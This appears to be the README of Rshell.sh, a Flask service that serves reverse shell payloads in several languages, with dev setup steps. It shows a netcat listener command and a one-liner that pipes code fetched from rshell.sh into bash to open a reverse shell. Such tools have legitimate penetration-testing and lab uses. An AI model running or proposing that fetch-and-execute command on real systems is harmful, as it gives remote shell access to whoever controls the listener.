# Rshell.sh Reverse Shell Payloads aaS

[Live Site!](https://rshell.sh)

## Overview / How it works

This project is multi-language reverse shell payload generator written in
Python3 using the Flask web framework. The point is to make it easy to quickly
pull reverse shell payloads down from the *cloud* ☁️  to your terminal using
`curl` or `wget`.

### Example Usecase

* Setup you listener:

```
nc -lvnp 1234
```

* Then query [`rshell.sh`](https://rshell.sh) to kick off the reverse shell:

```
curl rshell.sh/127.0.0.1/1234 | bash
```

## Languages Covered

* Bash
* Python
* Perl
* PHP
* Awk

See the project [help page](https://rshell.sh/help) for more information.

## Dev Site Install / Setup

The server-side setup is pretty straight forward and this is run just like any
other flask app. Of course the instructions below are for spinning up the dev
version. Production setup involves extra steps and depends on your hosting
environment.

* First clone the repo:

```
git clone github.com:BlueSquare23/Rshell.sh.git
```

* Then install the required python modules:

```
cd Rshell.sh
virtualenv venv		# Virtual Env Optional
source venv/bin/activate	# Virtual Env Optional
pip3 install -r requirements.txt
```

* Finally, run the project:

```
python3 app.py
```

## Technologies

* Language: [Python 3](https://www.python.org/)
* Web-Framework: [Flask](https://palletsprojects.com/p/flask/)

